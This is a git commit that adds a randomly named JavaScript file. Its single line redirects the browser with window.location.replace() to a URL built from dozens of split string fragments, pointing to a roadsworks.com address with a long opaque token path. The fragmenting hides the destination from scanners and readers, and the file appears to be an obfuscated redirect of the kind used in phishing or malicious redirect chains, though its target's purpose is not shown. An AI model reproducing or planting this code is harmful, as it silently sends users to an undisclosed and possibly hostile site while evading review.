e0cb0d2d609f148e38b1ca499ed596f0cbfb53f4
Excessors <113865732+Excessors@users.noreply.github.com>
2022-12-28 16:30:13 +0100

    Create ftjyfghydtyhdfgtyjhdrtghdrth.js

---
+++ ftjyfghydtyhdfgtyjhdrtghdrth.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dswo`,`rks.co`,`m/gQ_h`,`BEIK`,`QRfug`,`Bl4S`,`r-C7K`,`th`,`pMQ0h`,`6RRX`,`7Zjm`,`83q9`,`i27cmy`,`13xWS`,`H_Ot`,`p4LF`,`pLf36`,`X6eT`,`XGsMqO`,`sJ3O`,`UAQ6`,`Mhw~~/TA`,`HA/111PPP`,`FoKoPKlvjy`))
